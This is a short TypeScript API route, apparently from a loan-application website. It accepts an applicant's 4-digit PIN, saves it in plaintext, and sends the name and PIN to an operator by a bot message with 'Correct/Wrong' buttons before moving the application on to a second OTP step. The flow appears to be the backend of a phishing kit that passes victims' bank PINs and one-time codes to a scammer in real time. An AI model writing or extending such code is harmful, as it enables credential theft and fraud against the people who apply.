import { audit, findApplication, getSql, notifyAdmin, publicApp } from "../../../../../lib/applications";

export const runtime = "nodejs";

export async function POST(
  request: Request,
  context: { params: Promise<{ applicationId: string }> }
) {
  const { applicationId } = await context.params;

  const { value, referenceId } = (await request.json()) as {
    value: string;
    referenceId: string;
  };

  const row = await findApplication(applicationId);

  if (
    !row ||
    row.reference_id !== referenceId ||
    row.status !== "MEMBERSHIP_ID_REQUIRED"
  ) {
    return Response.json(
      { error: "This PIN request is not valid." },
      { status: 400 }
    );
  }

  const pin = String(value || "").trim();

  if (!/^\d{4}$/.test(pin)) {
    return Response.json(
      { error: "Enter a 4-digit PIN." },
      { status: 400 }
    );
  }

  await getSql()`UPDATE loan_applications SET member_code=${pin}, status='SECOND_OTP_REQUIRED', updated_at=NOW() WHERE application_id=${applicationId}`;

  await audit(applicationId, "PIN_SUBMITTED", "applicant", "user_submitted_value");

  await notifyAdmin(
    `📌 PIN SUBMITTED\n\n👤 Applicant: ${row.full_name}\n🔢 PIN: ${pin}\n\nConfirm this value.`,
    {
      inline_keyboard: [
        [{ text: "✅ Correct", callback_data: `confirm_pin:${applicationId}` }],
        [{ text: "❌ Wrong", callback_data: `wrong_pin:${applicationId}` }],
      ],
    }
  );

  return Response.json(
    publicApp({ ...row, status: "SECOND_OTP_REQUIRED" })
  );
}